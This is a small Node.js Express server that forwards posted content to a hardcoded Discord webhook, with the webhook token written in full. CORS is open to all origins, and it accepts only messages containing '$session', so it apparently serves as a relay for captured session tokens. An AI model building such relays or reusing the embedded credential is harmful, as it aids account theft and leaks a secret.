const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';

app.use(cors());
app.use(express.json());

app.post('/send-webhook', async (req, res) => {
  try {
    const { content } = req.body;

    if (!content || !content.includes('$session')) {
      return res.status(400).json({ error: 'Invalid content' });
    }

    const discordRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ content }),
    });

    if (!discordRes.ok) {
      return res.status(500).json({ error: 'Failed to send webhook' });
    }

    res.json({ success: true });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
